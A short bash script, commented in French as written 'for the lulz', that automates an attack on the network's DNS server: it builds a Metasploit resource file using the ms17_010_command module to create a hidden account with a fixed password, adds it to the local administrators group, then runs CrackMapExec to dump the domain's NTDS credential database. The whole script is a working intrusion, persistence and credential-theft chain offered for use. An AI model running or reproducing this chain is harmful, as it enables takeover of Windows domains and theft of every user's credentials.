#!/bin/bash
# Script pour le lulz

ip=$(systemd-resolve --status | grep "DNS Servers" | cut -d":" -f 2 | cut -d" " -f 2)

echo "use auxiliary/admin/smb/ms17_010_command" > pwnageDeMere.rc
echo "set COMMAND net user akerva_lle CyberP0nk_ /add" >> pwnageDeMere.rc
echo "set RHOSTS "$ip"" >> pwnageDeMere.rc
echo "exploit" >> pwnageDeMere.rc
echo "set COMMAND net localgroup administrateurs akerva_lle /add" >> pwnageDeMere.rc
echo "exploit" >> pwnageDeMere.rc
echo "exit -y" >> pwnageDeMere.rc

msfconsole -q -n -r pwnageDeMere.rc
cme smb $ip -u akerva_lle -p CyberP0nk_ --ntds
